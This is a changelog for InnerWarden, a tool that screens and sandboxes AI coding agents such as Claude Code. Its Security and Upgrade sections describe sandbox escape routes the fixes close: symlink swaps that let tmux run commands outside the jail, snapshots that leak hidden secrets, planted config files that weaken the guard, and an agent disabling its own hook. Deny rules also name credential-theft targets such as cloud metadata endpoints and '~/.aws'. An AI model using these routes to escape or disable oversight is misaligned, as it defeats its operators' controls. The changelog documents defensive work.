# Changelog

All notable changes to InnerWarden are documented here. This project
follows semantic versioning.

## 1.6.5 - 2026-10-24

1.6.4 was tagged and not published: its new jail check on macOS started
`sandbox-exec` with the account's environment. 1.6.5 is 1.6.4 with that check
under the launcher's own environment (root's two folders as `PATH`, no loader
variable), as every program a launch starts.


### Added

- **The dashboard shows what the free product does.** Overview, Decisions,
  Protection, Agents and Tokens were rebuilt on one foundation: each agent
  with its mode, what it screens and how to restart it (Claude Code: `/exit`,
  then `claude`; Codex: quit and start again), the decision history by day
  with the reason in words, recent sessions, the allow and mute lists with
  their remove step, the jail check, and how many MCP servers each agent has
  (local and remote). A value that could not be read is said as not read,
  never as off or zero, and monitor is said plainly.
- **One plan notice for an Active Defence host**: its licence ending soon,
  partly covered, lapsed to free mode, or not read, with the one step that
  fixes it. A Community install draws none.
- `install`, `agents connect`, `enforce` and `dry-run` say how to restart each
  agent they changed.

### Changed

- tokio 1.53.3 (RUSTSEC-2026-0386).

## 1.6.3 - 2026-10-23

### Fixed

- **Every cloud's metadata service is an internal target.** Besides EC2,
  Azure and GCP (`169.254.169.254`, `metadata.google.internal`) and Alibaba,
  the guard now reads the ECS task credentials endpoint (`169.254.170.2`,
  `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`), EKS Pod Identity
  (`169.254.170.23`) and EC2's IPv6 endpoints (`fd00:ec2::254`,
  `fd00:ec2::23`), with the address ended by a quote, a bracket or a
  variable too. Their credential reads are refused.
- **Removing the account's keys is destructive**, as removing the home is:
  `rm` of `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.kube`, `~/.azure`,
  `~/.config/gcloud`, `~/.aws/credentials`, `~/.kube/config` or a private
  key `~/.ssh/id_*` is refused. `rm ~/.ssh/known_hosts`, a `.pub` and a
  cache under a store stay cleanups.
- **`innerwarden graph --clear` is the person's**, as `allow` and `mute`
  are: refused with no terminal (an operator's `--operator` outside an
  agent's shell clears it), and the hook refuses an agent that runs it.
- **`check`'s human summary writes out what would repaint or hide the
  command** (control characters other than a new line or a tab, bidi
  overrides, characters that draw nothing) as `\u{..}`. `--json` is
  unchanged.
- **Chat alerts ping nobody and link nowhere**: Discord parses no mention in
  them, and Slack's `&`, `<` and `>` are escaped.

## 1.6.2 - 2026-10-23

### Fixed

- **The user namespace check of 1.6.1 runs bubblewrap like every other
  program `contain` starts**: with root's two folders as `PATH` and no
  dynamic loader variable (`helper_env`), instead of a cleared environment.
  Nothing a person sees changes; Active Defence reads the launcher's
  contract by that shape before it pins a free CLI release.

## 1.6.1 - 2026-10-23

### Fixed

- **`innerwarden contain` on Ubuntu 26.04 (and any kernel that restricts
  unprivileged user namespaces) asks bubblewrap itself.** Under
  `kernel.apparmor_restrict_unprivileged_userns = 1` it looked only for a
  profile file of its own and refused where the distribution's profile
  (`/etc/apparmor.d/bwrap-userns-restrict`, Ubuntu 26.04) already grants
  bwrap a user namespace, and the profile it printed replaced the
  distribution's once loaded. A run now starts bwrap once with a user
  namespace (`bwrap --unshare-user --ro-bind / / true`, 5 seconds at most):
  granted, nothing is said, whatever profile granted it; refused, the advice
  is said. Refused with the distribution's profile on disk, the advice loads
  that one (`sudo apparmor_parser -r /etc/apparmor.d/bwrap-userns-restrict`)
  and never writes another. A dry run, which runs nothing, goes by the files
  on disk, the distribution's included.

## 1.6.0 - 2026-10-22

### Upgrade notes: what to do

- **A profile's read-only path (`extra_ro`) through a link stays read-only
  where it leads.** `innerwarden contain --identity` follows your own links
  in such a path (in folders no jail writes: `~/code` or `~/.local` kept on
  another disk) and lays the path where the jail shows the folder it leads
  to. A link in a folder a jail writes (`~/.local/share/demo`, which a
  program in an earlier jail could have made) is followed only to a place
  the jail shows already, and the start says on one line that the link
  itself is not held ("... is a link in a folder a program in the jail can
  write: the jail keeps <where it leads>, where it leads, read-only, but
  that program could replace the link; ..."): replace the link with the
  folder it leads to. Such a link to a place the jail shows nothing else of
  is not followed: the path is left out, said ("... the jail does not
  follow it, and starts without the extra path; list the real folder
  instead"). On macOS nothing of this is left out: the path is denied
  writing as named and where it leads. On Linux, where `bwrap` cannot bind
  a folder from a descriptor (its `--help` lists no `--ro-bind-fd`: upstream
  bubblewrap before 0.10.0, or a distribution's package without the security
  update that added it; the current packages of Debian 12, Ubuntu 22.04 and
  24.04, and RHEL 9 have it), a read-only path in a folder a jail writes
  (`<project>/vendor`, `~/.local/share/claude/versions`) is left out and said
  ("... does not make it read-only; bubblewrap 0.10.0 or later, ... keeps
  it"): the jail shows it and its programs can write it, where 1.5.5 laid it
  read-only by name. Update bubblewrap to keep it. A profile with
  `start = "only_when_admitted"` does not start there: the launch stops,
  names each such path and says what to do. A read-only path in a place the
  jail hides (on Linux `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.mozilla`,
  `~/.thunderbird` and InnerWarden's own
  folder; on macOS `~/.ssh`, `~/.gnupg`, `~/.aws`, InnerWarden's own folder,
  `~/Library/Mail`, `~/Library/Messages` and `~/Library/Safari`; or where one
  of them leads), under a profile's `hide_home` path, your home or a folder
  above it, or with `--identity` `/run` or `/sys`, used to stop the launch:
  it is left out now, said on one line, and the jail starts without it. One
  that holds such a place where the jail shows it already (`~/.config`,
  which holds InnerWarden's own folder) is laid read-only, and the place
  stays hidden; on Linux one that holds such a place where the jail shows
  nothing else of it is left out.
- **A project whose `.git` file names a folder that does not name the
  project back is no worktree in `innerwarden contain`.** The jail shows a
  linked worktree's git folders only where git made them for this project:
  the worktree's git folder names this project's `.git` file back and sits
  in the `worktrees` folder of its repository, or (a submodule) its config
  names this project as its work tree; the repository is a git folder
  (`HEAD`, `objects`, `refs`); both belong to you; no link is on the way to
  either; and neither is your home, a folder above it, a place the jail
  hides, or in a hidden folder of your home that the jail does not show on
  Linux and lets no program write on macOS (`~/.kube`, `~/.docker`,
  `~/.password-store`, `~/.dotfiles`). Every folder
  on the way is there: a path through a folder that is not there and back
  (`nx/../L`) names none. Any other `.git` file is left alone, the start
  says why on one line, the jail starts, and git in a Linux jail sees no
  repository there, while git in a macOS jail cannot commit there (it may
  still read it). A worktree whose repository you keep in a hidden folder
  of your home that the jail does not show on Linux and lets no program
  write on macOS (`~/.dotfiles`; `~/.config`, `~/.local` and the other
  folders every jail shows writable are fine: the jail shows a repository
  there through that folder, and binds nothing more for it), or reach
  through a link, is not shown either: keep the repository elsewhere, or
  name it by its real path (`git worktree repair`). A worktree whose folder
  lies over the place InnerWarden's own folder, a hidden dotdir or a link
  inside one leads to is left out the same way, with one line, and the jail
  starts. A worktree moved by hand needs `git worktree repair` first. A
  repository made with `--separate-git-dir` (`git init` or `git clone`, the
  layout of dotfile managers such as yadm and vcsh) keeps nothing that names
  the project back, so it is not shown either, where 1.5.5 showed it (one in
  a folder the jail shows anyway, such as `~/.local/share`, still works):
  move its git folder into the project in place of the `.git` file, or work
  in a linked worktree (`git worktree add`).
- **The command line of a running jail's bubblewrap changed.** An
  identified jail's (`--identity`) now starts with its seccomp filter
  (`--seccomp <fd>`), before every other option. Where bwrap binds a place
  from a descriptor (bubblewrap 0.10.0 or later, or a package with the
  security update that added it), the real run of any jail binds the
  folders it pins, a profile's read-only paths and a worktree's git folders
  with `--bind-fd <fd> <place>` and `--ro-bind-fd <fd> <place>` instead of
  `--bind` and `--ro-bind-try` by name; a dry run still names each by its
  host folder. A tool that reads a jail's command line (from `/proc`) has
  to know those options.
- **On macOS a program in `innerwarden contain` can no longer rename, remove
  or replace the project folder itself, `~/.config`, a folder between the
  project and a `--deny-read` path, or any other folder the jail may write
  above a place it hides or a profile's read-only path (`~/.cache` or
  `/tmp` above a project there that holds a `--deny-read` path).**
  It still writes in them, finds them writable and sets their mode and
  times; only the folder itself keeps its name. A tool that renames the
  folder it works in has to run outside the jail. Where such a folder is not
  there yet (`~/.config` on an account that has none), `innerwarden contain`
  makes it first (0700) and says so. The same holds for each link on the way
  to a profile's `hide_home` path that sits in a folder the jail may write
  (`~/.cache/git` a link): it can no longer be removed, renamed or replaced
  from inside the jail.
- **On Linux a program in `innerwarden contain` can no longer rename or
  remove a folder it writes that sits above a place the jail covers.** Each
  such folder is now a mount point of its own, and `mv` or `rmdir` on it
  fails with "Device or resource busy": a folder between the project and a
  nested `--deny-read` path (`packages` and `packages/app` for `--deny-read
  packages/app/config/.env`), a folder above a profile's read-only path
  (`proj/third` above an `extra_ro` of `proj/third/lib`) or above a
  profile's `hide_home` path (`~/.cache/git` above `.cache/git/credential`),
  a folder above where a hidden dotdir or a `--deny-read` link leads
  (`~/.config/keys` above a `~/.ssh` that leads to `~/.config/keys/ssh`),
  and, with `--identity`, `~/.local/state` and `~/.local/state/innerwarden`.
  The jail still writes in each of them. A tool that renames such a folder
  has to run outside the jail. A jail started without `--identity`, with the
  default `--deny-read` paths, no profile and no linked dotdir, has none of
  these.
- **On macOS a profile's read-only path (`extra_ro`) is now read-only
  wherever it is.** Before, the macOS jail never denied writing it, so one
  in a folder the jail may write (the project, `~/.cache`, `~/.local`,
  `~/.config`, `/tmp`, `~/.claude.json`) was written as any other file
  there. A tool that writes at such a path now gets "Operation not
  permitted": with `extra_ro = ["~/.local/share/claude/versions"]` Claude
  Code can no longer update itself in the jail, and with `extra_ro =
  ["~/.claude.json"]` it can no longer save its settings there. Update the
  tool outside the jail, or take the path out of `extra_ro` if the jail has
  to write it.
- **A program in `innerwarden contain` can no longer make a btrfs or bcachefs
  subvolume or snapshot.** It gets "Operation not permitted". A tool that
  needs one (a container runtime on btrfs, `btrfs subvolume create`) has to
  run outside the jail.
- **On Linux, InnerWarden's own folder kept as a link stops `innerwarden
  contain`.** Where `~/.config/innerwarden` is a link (a dotfiles manager's),
  replace the link with the folder it leads to; `innerwarden contain` says
  how. Such a jail did not start before either.
- **A hidden dotdir behind a link the jail can change stops `innerwarden
  contain`.** Where the way to `~/.ssh`, `~/.gnupg` or `~/.aws`, to a link
  inside one, to InnerWarden's own folder, or (with `--identity` on Linux)
  to the launcher's records folder goes through a link in a folder the jail
  writes (`~/.aws` a link to `~/.cache/aws-link`, itself a link;
  `~/.local/state` a link), replace that link with what it leads to;
  `innerwarden contain` names it. On Linux, a link inside a hidden dotdir
  that leads to nothing yet, where the jail shows that place, stops it too:
  make what it leads to, or remove the link. Such an identified jail with
  the records folder behind a link did not start before either. So does, on
  Linux, a profile's `hide_home` path whose way goes through such a link
  (`~/.cache/git` a link, or a dotfiles manager's `~/.config/gh` link):
  replace that link with the folder it leads to.

### Security

- **A profile's read-only path never shows where a link a jail can change
  leads.** `innerwarden contain --identity` took each read-only path of a
  profile (`extra_ro`) where its links led. A program in an earlier jail
  that replaced that path, or a folder on the way to it, with a link (it
  can, in `~/.local`) made the next Linux jail show the place the link led
  to: a folder of your home the jail hides, or the host's `/tmp` and the
  sockets in it (a terminal multiplexer's, the display's), a way out of the
  jail. A link in a folder a jail writes is now followed only to a place the
  jail shows already, and the real Linux run binds each read-only path, and
  each folder it pins above one, from a descriptor it opens just before
  bwrap starts, one folder at a time with no link a program in a jail can
  change followed: a link put there after the launcher looked is never what
  the jail shows, and a place that changed so stops the launch. Measured
  before: a link swapped in while the launcher waited on the project's git
  files showed the host's `/tmp` in the next identified jail, and `tmux`
  there ran commands outside it. The launcher no longer waits on a file a
  program in the jail can write: it read the project's `.git` file and the
  `commondir` it names with a blocking read, so a FIFO there held it for as
  long as that program liked.
- **A program in `innerwarden contain` can no longer have the next jail
  show a folder of your home writable.** The jail binds a linked worktree's
  git folders read-write, and took them from the project's `.git` file,
  which the agent writes: `gitdir: ~/.kube` (or `~/.docker`,
  `~/.password-store`, another repository, `~/bin`, `~/.bashrc`, or on
  macOS `~/Library/LaunchAgents`) made the next jail in that project, with
  or without `--identity`, show that place writable: the agent read and
  changed what is there, and could run code outside the jail the next time
  you use it. Git's own files there were no proof either: a project in a
  folder named `worktrees` whose `.git` named the project itself made the
  folder two above it (`~/code`, with every repository in it) the
  repository. A git folder is taken now only where it is a git worktree of
  this project (see Upgrade notes), every path found with every folder on
  the way there and no link on it, and where bwrap binds a place from a
  descriptor the real Linux run binds it from one it opens just before
  bwrap starts, so a folder on the way swapped for a link since the launcher
  looked stops the launch. An older bwrap binds it by name, as before; a
  repository in the project or in a folder every jail writes (`~/.config`,
  `~/.local`) is not bound at all, since the jail shows it there.
- **A profile's read-only path never keeps a hidden dotdir from being
  hidden.** A read-only path at or inside the place `~/.ssh`, `~/.gnupg` or
  `~/.aws` leads to (a link to another disk) made the jail leave that place
  as it was: a macOS jail read everything in it, and a Linux jail showed the
  read-only path there. The place is hidden now, and the read-only path in it
  left out and said.
- **On macOS a jail can no longer move a folder above what it hides.** In
  1.5.5 and earlier, in every macOS jail, a program in it could rename a
  folder it may write that holds a place the jail denies, and then read that
  place under the new name, or put a folder of its own in that folder's
  place, whose files the host's guard read. Every macOS jail now keeps such
  folders in place, the project and the folder that holds InnerWarden's own
  folder among them; the jail still writes in them.
- **On Linux a hidden place inside a project kept in a folder the jail
  writes stays where the host reads it.** Where such a place sat in a
  project kept two or more folders down inside a home folder the jail binds,
  a folder above the project could be renamed, and the host's link then led
  to a folder the jail made. Each folder the jail writes between such a
  place and your home is now a mount point of its own.
- **No jail makes a new btrfs or bcachefs subvolume or snapshot.** In 1.5.5
  and earlier, on a btrfs or bcachefs disk where the project, or a folder the
  jail shows, is a subvolume, a program in the jail could snapshot it, and
  the snapshot held in full the files the jail hides there (`.env`,
  `secrets/`, each `--deny-read` path): the jail covers those paths with
  empty mounts, and a snapshot copies what the disk holds under them. On
  Linux, where the host takes the jail's seccomp filter, every jail now
  refuses the four btrfs commands and the two bcachefs ones that make a
  subvolume or a snapshot, on every ABI the filter runs. A snapshot made
  before the jail started, in a folder the jail shows, still holds those
  files: only new ones are refused, so keep such snapshots out of the
  project.
- **The jail hides InnerWarden's own folder wherever it shows it.** On Linux,
  where a home folder the jail binds is a link that leads off the home
  (`~/.cache` on another disk) and `~/.config` is a link into it, the jail
  covered `~/.config/innerwarden` as named and as it resolves, but showed it
  a third time through `~/.cache`, with the model key in it. It is covered
  there too, and so are the launcher's records in an identified jail (where
  `~/.local` is such a link). A project at that place is refused, as one at
  `~/.config/innerwarden` is.
- **The jail hides what it hides wherever a link leads it.** In some home
  layouts that use symbolic links, a folder the jail hides by default, a
  `--deny-read` path or InnerWarden's own folder could still be read in the
  jail. Each is now hidden where it really is, at every place the jail shows
  it, in every jail; on macOS it is denied where it leads, also outside your
  home. A link never moves a mask or a deny onto what the jail needs (the
  guard, the agent's settings or a file in them, such as the one that
  carries the hook, the project, and for a `--deny-read` path a read-only
  path of the profile; a hidden dotdir is hidden even there), and a link that a
  program in the jail can change (a `--deny-read` link in the project) never
  moves one onto what the jail runs on: on Linux a place outside your home,
  on macOS a place of the system. Such a place is left as it is, and
  `innerwarden contain` says so where the jail shows it. A worktree over the
  place a hidden dotdir leads to, and a read-only path of a profile there,
  are left out of the jail, and said. In
  every common layout the jail is the one it was. A link inside one of those
  dotdirs (`~/.ssh/config` a link into `~/.config/dotfiles`, as GNU stow and
  chezmoi make one per file where `~/.ssh` is there) is hidden where it
  leads the same way; the launcher looks for such links as far as 100000
  entries and 32 folders deep, and says where it stops short.
- **A jail can no longer move a hidden place away from the name the host
  reads it by.** A mount moves with the folder it is in, and Linux renames a folder
  that is not itself a mount point: a program in the jail that renamed the
  folder above a covered place (`~/.config/keys` above `~/.config/keys/ssh`,
  where `~/.ssh` leads; `~/dotfiles/ssh` above a stowed `~/.ssh`;
  `~/.config/app` above where a `--deny-read` link in the project leads; the
  `~/.local/state` above the launcher's records in an identified jail) took
  the cover with it and made a folder of its own at the name the host's
  link, or the launcher, reads. Each folder the jail writes between such a
  place and your home is now a mount point of its own, and the rename
  fails. On macOS the sandbox let the jail rename a folder above a denied
  place, the project included: each such folder the jail may write is now
  closed to renaming and removal, and the jail still writes in it.
- **A dotdir, InnerWarden's folder or the launcher's records behind a link
  the jail can change is refused.** The jail hid where such a way led, but
  a program in it could replace the link in the folder it writes with a
  folder of its own, on the host, and the host's `aws`, `ssh` or `gpg` then
  read its config and ran what it named (`credential_process`, `Match
  exec`, `pinentry-program`), or the launcher kept its records there. No
  mount or deny pins a link, so such a launch is refused (see Upgrade
  notes). On Linux the same holds for a profile's hidden home path: the
  host's programs read the jail's folder at that name, and wrote into it
  what the path was hidden for (a credential cache's socket, a token). On
  macOS the sandbox keeps each link on the way to a profile's hidden home
  path in place instead, also one further down a chain (`~/.local/a`, for
  `~/.cache/git` a link to `~/.local/a/git` and `~/.local/a` a link): before,
  a program in the jail could remove such a link and make a folder of its
  own there, and the host's git then kept its credential cache in it.
- **A profile's read-only path stays read-only.** On Linux the read-only
  bind of an `extra_ro` path inside the project, or a worktree's folder,
  came before the bind of that folder, which covered it, and on macOS
  nothing denied writing any `extra_ro` path, so one in a folder the jail
  may write (the project, `~/.cache`, `~/.local`, `~/.config`, `/tmp`,
  `~/.claude.json`) was written: a program in the jail wrote it. Each is
  read-only on both now (see Upgrade notes), and each folder the jail writes
  above a read-only path is kept in place, so the path is never moved away
  from its name.
- **A suppression planted in the jail no longer lifts the hook's verdict.**
  Inside the jail the hook read the person's suppressions from
  `~/.config/innerwarden`, which on Linux is an empty folder of the jail's
  own that its programs can write: a `suppress.toml` written there let
  through the command it names. The hook in a jail now reads none
  (`IW_SUPPRESS_CONFIG=/dev/null`); your own file was never visible there.
- **An LLM or notification config planted in the jail is no longer read.**
  The jail meant to turn the hook's LLM second opinion and notifications
  off with `IW_LLM_CONFIG` and `IW_NOTIFY_CONFIG` left empty, but an empty
  value made the hook read `llm.toml` and `notify.toml` in that same
  folder: a program in the jail could send each command the hook reviews to
  an endpoint of its choosing, stall the hook on it, and fire webhooks of
  its choosing. It could not lift a refusal. Both now read nothing
  (`/dev/null`).
- **On Linux, a jail can no longer replace InnerWarden's own folder kept as
  a link.** The link sits in the `~/.config` the jail binds read-write, and
  no mount can pin a link: a program in the jail could put a folder of its
  own in its place, on the host, whose files the host's guard reads. Such a
  launch is refused (see Upgrade notes).

### Changed

- **On Linux a `--deny-read` path that a link in the project leads out of
  your home is not hidden there.** Such a link is the agent's to change, and
  a mask it steers could land on what the jail runs on (a file in `/etc`, a
  library the hook loads). Where the jail shows that place, `innerwarden
  contain` says it is not hidden: keep the secret in your home or your
  project to have it hidden. A path you name outside the project (absolute,
  or with `..`) with no such link on the way is hidden where it leads, as
  before. On macOS such a place is denied where it leads, unless it is a
  place of the system outside the project.

### Fixed

- **The launcher no longer says the API key is hidden where it is not.**
  Where the place InnerWarden's own folder leads to is left as it is (said
  before), the launch line said the folder, the API key with it, was not
  visible in the jail. It now says the place its link leads to is not
  hidden.
- **The first jail on an account where Claude Code never ran has the guard's
  hook.** Arming the hook makes `~/.claude`, and the jail was planned before
  that, without it: on Linux the first `innerwarden contain` there showed no
  `~/.claude/settings.json`, so the hook never fired inside, while the
  launcher said it was armed. The jail is planned again once the hook is
  armed. A dry run arms nothing, so on such an account it still shows a jail
  without `~/.claude`.
- **Claude Code keeps its settings in an identified jail.** In
  `innerwarden contain --identity` on Linux the jail's home is an empty
  folder of its own, so Claude Code's settings file, `~/.claude.json`, was
  gone at every launch: from the second launch on Claude Code said twice that
  the file was missing, and what it saved there (an MCP server you added, its
  first-run answers) was lost. In the jail that file now leads to
  `~/.claude/.claude.json`, in the folder the jail already shares, so it is
  kept between launches. Your own `~/.claude.json` is not shown in the jail
  and its Claude Code never uses it, and the copies Claude Code keeps of it in
  `~/.claude/backups` are not shown either: each identified jail has an empty
  `~/.claude/backups` of its own. Where your own `~/.claude.json` is a link,
  or a hard link, to a file in `~/.claude`, that file is shared with the jail
  like the rest of the folder, and where `~/.claude/backups` is a link of
  yours the jail shows the host's copies (`innerwarden contain` says so). Not
  where a hidden home path or a read-only path of the profile covers that
  place or names `~/.claude.json`, where it is a link of yours or anything
  other than a file, or where your own `~/.claude.json` is that file or leads
  into `~/.claude` or to nothing: Claude Code then keeps its file in the
  jail's own home, as before. Every jail shares `~/.claude`, so what a
  program in any jail writes to `~/.claude/.claude.json` is what the next
  identified Claude Code loads, as with `~/.claude/settings.json`: an MCP
  server listed there starts with it.
- **Two identified jails at once no longer share Claude Code's session
  file.** Claude Code is process 2 in every jail and lists each running
  session as `~/.claude/sessions/<pid>.json`, in the `~/.claude` the jails
  share, so two jails at once wrote and read the same `2.json`. Each
  identified jail now has its own empty `~/.claude/sessions` (the launcher
  makes the folder, 0700, where it is not there), at every place the jail
  shows it, and none sees the sessions running outside it. Only for Claude
  Code's folder at `~/.claude`, where it is unless `CLAUDE_CONFIG_DIR` names
  another; where the jail cannot have the folder of its own (a link is there,
  the project is inside it), `innerwarden contain` says so. A jail started
  without `--identity` is unchanged: there Claude Code's settings file is
  still gone at every launch, and its session list is still shared.

## 1.5.5 - 2026-10-11

### Upgrade notes: what to do

- **`innerwarden dashboard` refuses what it does not understand.** A word such
  as `tunnel` or `open`, or `--bind` with no address, used to be skipped: the
  dashboard started on the default address and said nothing about the word.
  It now prints what it did not understand and the usage, and exits 2. The
  documented flags (`--bind IP:PORT`, `--expose`) are unchanged. A script that
  passed an extra word will now stop at it; remove the word.
- **`innerwarden status` prints the `[unknown]` explanation only under an
  `[unknown]` line.** On a healthy machine the closing note about `[unknown]`
  described a line that was not there.
- **The agent can run `innerwarden mute --list` and `--help` again.** The
  guard denied any command that contained `innerwarden mute` or
  `innerwarden dry-run`, including reading the mute list, asking for help,
  and text that only names the verb in a search or a commit message. Those
  now pass: `mute --list`, `mute --remove <rule>`, a bare `mute`, `--help`
  anywhere, and the verb inside a `grep`, `rg`, `git commit`/`log`/`show`, or
  an `echo`/`printf` whose output goes nowhere but the screen. Everywhere
  else the text `innerwarden mute <rule>`, `dry-run` or `monitor` is still
  denied, as in 1.5.4, whatever program would run it (a launcher, a pty, an
  interpreter, a heredoc, a file written and then run), and `monitor` is now
  held to the same rule as `dry-run`. Run these from your own terminal. Two
  details: the read-only words are judged in their documented order, so
  `mute ATR-1 --remove` reads as muting `ATR-1` (write `mute --remove
  ATR-1`); and a command that only prints the verb through `ssh` or `docker
  run` (`ssh host grep 'innerwarden mute' f`) is still denied, because the
  remote side runs that text.
- **Releases are stopped if the installer does not set `umask 022`.** The
  installer creates `~/.local/bin` and the binary with the caller's umask,
  which is 0002 on Ubuntu and Debian, so they came out group-writable and the
  CLI's own screening refused the binary. No change for installs that exist.
  The installer lives in the distribution repository, so its change has to be
  merged there before the next release can pass this check.
- **The Tokens page counts the whole retained history.** It used to read only
  the newest 64 MB of each agent's history and show that as the total, so a
  machine with years of transcripts showed a small fraction of its real use.
  Nothing to configure. The first scan after the dashboard starts reads the
  whole history (up to 1 GiB per refresh, newest files first, then carries on
  in the next pass), so the figures can start low and grow for a short while on
  a very large history. Later refreshes read only what was appended.
- **A capped scan says it is a sample.** When a limit still cuts the scan, the
  row shows "A sample, not the total: the newest N of M history files." and the
  Overview tile says "(a sample, not the total)". The JSON gains an additive
  `coverage` object (`complete`, `files_read`, `files_found`; numbers only) on
  each agent with counters, and `provenance.quality` is `sample` instead of
  `partial`. Older readers ignore the new field.
- **Claude Code's file tools are judged too.** The hook now also runs for
  `Write`, `Edit`, `MultiEdit` and `NotebookEdit`, and refuses a change to a
  privileged file: the agent's settings (`~/.claude/settings.json`, a
  project's `.claude/settings.json` and `.claude/settings.local.json`, the
  other agent configurations the guard wires), the guard's own configuration
  (`~/.config/innerwarden`) and program, shell startup files (`.bashrc`,
  `.zshrc`, `.profile`, ...), SSH keys, cron and the system's and your own
  services, and stored credentials (`~/.aws`, `~/.docker/config.json`,
  `~/.kube/config`, `~/.npmrc`, ...). Every other edit is allowed at once,
  without a word and without a record. `innerwarden install claude-code` (or
  `agents connect claude-code`) writes the new `PreToolUse` entry beside the
  Bash one, in the mode the hook already has. With automatic setup on, the
  dashboard and `innerwarden upgrade` add it for you without asking, by
  rewriting `~/.claude/settings.json` once; on a hook that enforces, the agent's
  edits of the files above (`~/.bashrc`, `~/.aws/...` and the rest) are refused
  from then on, where they used to go through. Without automatic setup nothing
  is rewritten, and `innerwarden status` reports `[off] only shell commands
  are judged` (and the headline says the machine is not fully protected)
  until you run `innerwarden install claude-code`. Either way, restart Claude
  Code afterwards: it reads its hooks at startup. `innerwarden status` says
  which tool classes each agent's wiring judges, and names the command when a
  hook judges shell commands only or records file changes without refusing
  them while its shell hook refuses.
- **A privileged file is known by what it is, not only by its name.** A hard
  link to one, the real file a home link points at (`~/.bashrc ->
  ~/dotfiles/bashrc`: the agent's edit of `~/dotfiles/bashrc` is refused), a
  new file in a privileged directory reached through a link, and the guard's
  program under another name are refused as that file. If you keep your
  dotfiles in a repository and let the agent work there, edits to the files
  your home links to are now yours to make. A hook run without `HOME` judges
  against the home the account database names.
- **`uninstall` removes two entries.** It reports "removed 2 entries" where it
  reported 1, the Bash hook and the file-tools hook. Uninstall with this
  version: a 1.5.4 or earlier `innerwarden uninstall` does not know the
  file-tools entry and leaves it behind, and with the program gone Claude Code
  reports a hook error on every file edit until the entry is removed from
  `~/.claude/settings.json`.
- **Asking the agent to edit `~/.claude/settings.json` is now refused.** That
  request was allowed before, and it is the same change an agent would make to
  switch its own guard off, so the guard cannot tell the two apart. Edit the
  file yourself: your own editor and shell are not screened. The same holds
  for the other files above.
- **The MCP proxy reads every line the way the server will.** A message is
  parsed as JSON where the last of two equal keys wins, so a call that hid a
  second `params` behind a first one is inspected as the call the server
  runs, and forwarded in that form. A batch (a JSON array, which clients of
  the 2025-03-26 protocol revision send) is judged element by element; in
  `guard` mode a refused element is answered on its own and the rest of the
  batch goes on, in `kill` mode none of it does. A message without
  `"jsonrpc": "2.0"` is inspected rather than passed through. Blank lines are
  still dropped.
- **A client line that is not JSON is refused in `guard` and `kill` mode.** It
  is not forwarded, and the client gets a JSON-RPC parse error (`-32700`,
  `id: null`). So is JSON nested more than 128 levels deep, which the proxy
  cannot read and used to forward unread. In `advisory` (the default) and
  `warn`, which never block, the line is forwarded as before and an
  `AG-MCP-PARSE` finding says it went uninspected. A protocol-conforming
  client sends neither. An escaped lone surrogate (`"\ud800"`, which a
  JavaScript client can produce) is read, not refused.
- **A message with a repeated key is forwarded as it was inspected, both
  ways.** Client and server lines that repeat a key (which no conforming peer
  sends) are re-serialized with the last value, the one the proxy judged, so
  a peer whose parser keeps the first value cannot be handed one the proxy
  never saw. Lines without a repeated key keep their exact bytes.
- **Server output that is not a message is treated as tool output.** Text a
  server writes to its MCP stream that is not a JSON-RPC message still reaches
  the client, and is now scanned for prompt injection and remembered by the
  taint check, so a later call that reuses it is held. A server that prints a
  banner or log lines to stdout (instead of stderr) can see such a call held
  in `guard` mode; send its logs to stderr.
- **`readOnlyHint` no longer hides a write tool.** A server that declares a
  tool read-only is not believed for the privileged-file check when the
  tool's name says it writes: `write_file`, `edit_file`, `move_file`,
  `create_directory`, and any name with a word such as write, edit, create,
  move, rename, delete, replace, save, patch or copy (`writeFile`,
  `fs_write`, `str_replace_editor`). The call is judged as the write it is.
  Other tools keep the server's word, as before.

### Changed

- Token history is indexed per file (length, time, how far it was read) and
  only the bytes appended since the last refresh are read. A file that shrank,
  was rewritten or was removed makes the index rebuild from scratch, so the
  totals never keep tokens from history that is gone. Message and session ids
  are kept only as 64-bit digests in memory for de-duplication and are never
  written or served.
- The dashboard JavaScript is 2.6 kB smaller (the shared part, which the paid
  dashboard also builds from, is 3.1 kB smaller): class lists that were
  repeated in many components are declared once.

## 1.5.4 - 2026-10-11

### Upgrade notes: what to do

- **Scripts that add allow or mute entries need `--operator`.** `innerwarden
  allow <pattern>` and `innerwarden mute <rule>` now run only in a terminal.
  A script of yours that runs them with no terminal (CI, provisioning,
  dotfiles) must pass `--operator`; it is not honoured inside an AI agent's
  shell. `--list`, `--remove` and help need nothing. The refusal exits 1 and
  changes nothing.
- **`allow = ["*"]` is ignored.** A pattern that is only `*` would switch
  screening off; it is dropped at load with a warning, and `innerwarden
  allow '*'` is refused. Use `innerwarden dry-run` to stop blocking.
- **A pattern whose first word holds a `*` lifts only a review.** An allow
  pattern such as `* | bash` or `c*` still loads (with a warning from
  `innerwarden check` and `allow --list`) and still lifts a command held for
  review, but no longer lifts a refused command, a fetch-and-run, an
  obfuscated command, a persistence write or a look-alike package. Write the
  command's first word out (`curl -fsSL https://sh.rustup.rs*`) to lift those.
- **Removing a home is refused.** `rm -rf ~`, `~/`, `~/*`, `~user`, `$HOME`,
  `"${HOME}"`, `/home/<user>`, `/Users/<user>` and `/root` are a deny. So are
  `rm -rf *`, `.`, `./*` and `..` when the agent runs them from the home or
  from `/`. A path under the home (`rm -rf ~/.cache/x`, `rm -rf
  "$HOME/.cache/x"`) is scoped work and is no longer refused as a hidden
  target.
- **An agent reading a secrets file outside its project is blocked.** A
  `.env`-class file read from outside the repository the agent works in
  (`cat ~/secret.env`, `cat /srv/other/.env`) stays `review` and is now
  blocked for an agent. The project's own `.env`, from anywhere in the
  repository (`cat ../.env` in a monorepo package), and the main checkout's
  from one of its worktrees or submodules, are unchanged; so is a `.env` in a
  directory above a project that is not under git. A session started in the
  home or in `/` keeps the old verdict.

### Fixed

- **A long command is judged whole.** The rewrite that exposes obfuscated
  commands kept only the first 8 KB, cut by byte: a multi-byte character
  across the cut stopped the screening, and what followed the first 8 KB was
  never rewritten. It now rewrites the whole command piece by piece. A long
  benign heredoc or generated script keeps its verdict.
- **A failure while screening refuses the call.** If the hook stops on an
  internal error it exits 2 in enforce (the call is refused) and 1 in
  monitor. The MCP proxy exits 1 and never forwards the call it was
  screening.
- **The advice after a block is for the person.** It no longer prints a
  ready-to-run `innerwarden allow '<command>'`, which the agent reads first.
- **The agent cannot widen its own guard from the shell.** `innerwarden
  allow` / `mute` / `dry-run` run by the agent (through a path, quotes, a
